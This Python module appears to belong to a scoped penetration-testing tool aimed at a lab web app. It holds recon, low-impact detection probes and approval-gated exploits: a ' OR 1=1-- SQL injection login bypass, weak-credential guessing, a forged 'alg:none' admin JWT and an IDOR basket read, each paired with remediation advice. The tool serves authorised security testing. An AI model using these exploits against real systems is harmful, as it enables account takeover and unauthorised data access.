"""Active (attacking) VAPT checks, hard-scoped to the authorized lab target.

Phases:
  recon   - GET-only discovery of safe, well-known endpoints (auto).
  detect  - low-impact probes that signal a likely vulnerability (auto).
  exploit - active exploitation that proves impact (requires approval).

Every request flows through http_client.HttpClient, which refuses any target
other than the authorized scope. Exploit functions additionally refuse to run
unless approved=True is passed by the orchestrator after the approval gate.
"""
from __future__ import annotations

import base64
import json
from typing import Any

from http_client import HttpClient, Response
from vapt_mvp import Evidence, Finding

RECON_PATHS = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/ftp", "/rest/products/search?q="]
MARKER = "vaptprobe8731"


def _json(resp: Response) -> Any:
    try:
        return json.loads(resp.text)
    except (ValueError, TypeError):
        return None


def _token(data: Any) -> str | None:
    if isinstance(data, dict):
        auth = data.get("authentication")
        if isinstance(auth, dict) and auth.get("token"):
            return str(auth["token"])
        if data.get("token"):
            return str(data["token"])
    return None


def _require(approved: bool) -> None:
    if not approved:
        raise PermissionError("exploitation requires an approved exploit token")


# --- Recon (auto) --------------------------------------------------------
def recon(client: HttpClient) -> list[dict[str, Any]]:
    results: list[dict[str, Any]] = []
    for path in RECON_PATHS:
        try:
            resp = client.get(path)
            results.append({"path": path, "status": resp.status, "content_type": resp.headers.get("Content-Type")})
        except Exception as error:  # scope or transport issues become recon notes, not crashes
            results.append({"path": path, "status": None, "error": str(error)})
    return results


# --- Detection (auto, low impact) ---------------------------------------
def detect_sql_injection(client: HttpClient) -> Finding | None:
    resp = client.post("/rest/user/login", json={"email": "'", "password": "x"})
    body = resp.text.lower()
    if resp.status >= 500 and ("sqlite" in body or "syntax error" in body or "sql" in body):
        return Finding(
            "sqli-login-error", "SQL error triggered on login endpoint", "high",
            "A single quote in the login email field produced a database error, indicating input is concatenated into a SQL query.",
            [Evidence("response", {"status": resp.status, "snippet": resp.text[:200]})],
            remediation="Use parameterized queries / an ORM for authentication lookups.")
    return None


def detect_reflected_input(client: HttpClient) -> Finding | None:
    resp = client.get(f"/rest/products/search?q={MARKER}")
    if MARKER in resp.text:
        return Finding(
            "reflected-search-input", "Search input reflected in response", "medium",
            "The product search endpoint reflects the raw query back in its response, a precursor to XSS if rendered unsafely.",
            [Evidence("response", {"status": resp.status, "reflected": True})], confidence="medium",
            remediation="Encode user input on output and apply a strict Content-Security-Policy.")
    return None


# --- Exploitation (gated: approved=True required) ------------------------
def exploit_sql_login_bypass(client: HttpClient, approved: bool) -> tuple[Finding | None, str | None]:
    _require(approved)
    resp = client.post("/rest/user/login", json={"email": "' OR 1=1--", "password": "x"})
    token = _token(_json(resp))
    if resp.status == 200 and token:
        return (Finding(
            "sqli-auth-bypass", "Authentication bypass via SQL injection", "critical",
            "A SQL injection payload in the login email field returned a valid session token without valid credentials.",
            [Evidence("auth_token_prefix", token[:12] + "..."), Evidence("payload", "' OR 1=1--")],
            remediation="Use parameterized queries for authentication; never concatenate input into SQL."), token)
    return (None, None)


def exploit_weak_login(client: HttpClient, approved: bool, candidates: list[dict[str, str]]) -> tuple[Finding | None, str | None]:
    _require(approved)
    for cred in candidates:
        resp = client.post("/rest/user/login", json={"email": cred.get("email"), "password": cred.get("password")})
        token = _token(_json(resp))
        if resp.status == 200 and token:
            return (Finding(
                "weak-credentials", "Weak or default credentials accepted", "high",
                f"The account {cred.get('email')} authenticated with a weak password from a common list.",
                [Evidence("account", cred.get("email"))],
                remediation="Enforce a strong password policy and disable default/test accounts."), token)
    return (None, None)


def _forge_jwt_none(email: str) -> str:
    def seg(obj: Any) -> str:
        return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()
    return f"{seg({'alg': 'none', 'typ': 'JWT'})}.{seg({'data': {'email': email, 'role': 'admin'}, 'iat': 0})}."


def exploit_jwt_none(client: HttpClient, approved: bool, email: str = "admin@juice-sh.op", probe_path: str = "/rest/basket/1") -> Finding | None:
    _require(approved)
    token = _forge_jwt_none(email)
    resp = client.get(probe_path, headers={"Authorization": f"Bearer {token}"})
    if resp.status == 200 and _json(resp) is not None:
        return Finding(
            "jwt-none-accepted", "Forged 'alg:none' JWT accepted", "critical",
            "The API accepted a JWT signed with the 'none' algorithm, allowing token forgery and identity spoofing.",
            [Evidence("probe_path", probe_path), Evidence("forged_token_prefix", token[:16] + "...")],
            remediation="Reject tokens whose alg is 'none'; pin the expected signing algorithm server-side.")
    return None


def exploit_idor_basket(client: HttpClient, approved: bool, token: str | None, other_id: int = 2) -> Finding | None:
    _require(approved)
    if not token:
        return None
    resp = client.get(f"/rest/basket/{other_id}", headers={"Authorization": f"Bearer {token}"})
    if resp.status == 200 and _json(resp):
        return Finding(
            "idor-basket", "Insecure direct object reference on basket", "high",
            f"A session authenticated as one user could read basket id {other_id} belonging to another user.",
            [Evidence("accessed_basket", other_id), Evidence("status", resp.status)],
            remediation="Enforce per-user authorization checks on every object access.")
    return None
